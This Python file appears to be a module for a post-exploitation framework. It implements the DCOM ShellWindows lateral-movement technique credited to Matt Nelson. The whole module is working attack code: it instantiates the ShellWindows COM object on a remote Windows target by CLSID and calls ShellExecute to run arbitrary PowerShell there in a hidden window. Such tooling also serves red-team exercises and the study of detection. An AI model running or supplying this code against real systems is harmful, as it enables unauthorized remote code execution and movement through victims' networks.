from termcolor import colored, cprint
from module import Module


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "DCOM-ShellWindows",
                       "Description": "Lateral Movement DCOM",
                       "Author": "Matt Nelson",
                       "Link": "https://www.cybereason.com/blog/dcom-lateral-movement-techniques",
                       "License": "BSD 3-Clause",
                       "Module": "@pablogonzalezpe, @josueencinar"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "target": [None, "Windows IP you want to access", True],
                    "instruction": [None, "PS Code to execute in the remote machine", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        function = """
            function DCOM-ShellWindows {
                param(
                    [String] $instruction,
                    [String] $target

                )
                $clsid = "9BA05972-F6A8-11CF-A442-00A0C90A8F39"
                $obj = [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID($clsid, $target))
                $obj.item().Document.Application.ShellExecute("powershell.exe", "-C $instruction", "c:\windows\system32\windowspowershell\v1.0", $null, 0)

            }
        """
        function += 'DCOM-ShellWindows -instruction {} -target "{}"'.format(self.args["instruction"], self.args["target"])
        super(CustomModule, self).run(function)
